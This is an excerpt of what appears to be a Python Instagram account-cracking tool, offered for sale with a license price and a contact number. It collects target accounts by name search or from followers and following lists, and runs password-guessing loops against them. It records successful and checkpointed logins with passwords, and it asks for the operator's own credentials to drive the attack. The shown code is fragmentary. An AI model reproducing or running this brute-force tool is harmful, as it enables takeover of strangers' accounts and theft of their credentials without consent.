...
def login():
	global external
	try:
		print(f'\n{M}!{C} Use Instagram username and password to login.  before logging in make sure the account is public not private\n')
		us=input(f"{H}>{C} Enter username: ")
		pw=stdiomask.getpass(prompt=f'{H}>{C} Enter password: ')
	except KeyboardInterrupt:
		exit(f'{M}>{C} KeyboardInterrupt detected... exit !')
	...
	if x.get('status')=='success':
		...
		exit(f'{M}!{C} The username or password you entered is incorrect')
...
{D}|3| = Crack Serch Name
{D}|2| = Crack User Public
{D}|3| = Crack User Following

{D}|4| = Account crack 
{D}|5| = List Account Crack 
{D}|9| = bot auto follow
{M}[P] Remove Insta
	""")
	...
	def BUG(self):
		print(f"""
 [{U}>{C}] 1 Month License/ 150k
 [{U}>{C}] You can report directly to Whatsapp
 [{U}>{C}]  {H}07069457594{C}
		""")
		exit()

	def Exit(self):
		x=input(f'\n [{M}>{C}] Are you sure you want to leave ? [Y/t]: ')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python instagram.py')
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit(f"\n [{M}!{C}] The username you entered was not found, make sure the target is public")
		return idx
	...
	def infoAPI(self,cookie,api,id):
		try:
			...
			print(f'\n [{M}!{C}] The username you entered was not found')
		return internal

	def passwordAPI(self,xnx):
		print(f'\n [{H}+{C}] ALL id >> [{H}{len(internal)}{C}]')
		print(f"""
 [ List Api Password  ]

 [1]. API V1
 [2]. API V2
 [3]. API V3 [\033[1;92m FAST]
		""")
 ...
 [3]. USER  3 [\033[1;92m FAST]
		...
		print(f"""
 [{H}+{C}]  Wizzyb - OK>>>>/{day}.txt
 [{O}+{C}]  Wizzyb - CP  >>>>> /{day}.txt

 [{M}!{C}] Wait 10 min _ 15 min
		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [Cracking][{K}{loop}/{len(internal)}{C}] {H}[Wizzyb - Ok:{len(success)}]{C}  {M}[CP :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
  ...
  {H}[+]{C} {H}Followers: {H}{pengikut}{C}
  {H}[+]{C} {H}Following: {H}{mengikut}{C}
  {H}[+]{C} {H}Post: {H}{postingan}{C}
					""")
  ...
  {M}[+]{C} Password: {M}{pw}{C}
  {M}[+]{C} Followers: {M}{pengikut}{C}
  {M}[+]{C} Following: {M}{mengikut}{C}
  {M}[+]{C} Post: {M}{postingan}{C}
					""")
  ...
  {M}[>]{C} Post: {M}{postingan}{C}
	...
	def menu(self):
		...
		if c=='':
			...
			m=int(input(f'\n [{U}?{C}]  Enter the target amount : '));print('')
			for i in range(m):
				i+1
				nama=input(f' [{U}>{C}] Enter search name ({H}{len(internal)}{C}): ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			print(f'\n [{M}!{C}] Target must be public, not private')
			m=input(f' [{M}?{C}] Name instagram: ')
			...
			print(f'\n [{M}!{C}] Target must be public, not private')
			m=input(f' [{M}?{C}] Enter username instagram: ')
			...
			print(f'\n [{M}!{C}] The process of checking account status.  Please wait a moment\n')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
			...
			xx=c.split("-")
			xc=xx[0]
			print(f'\n [{U}>{C}] Total results found [{H}{len(g)}{C}]')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
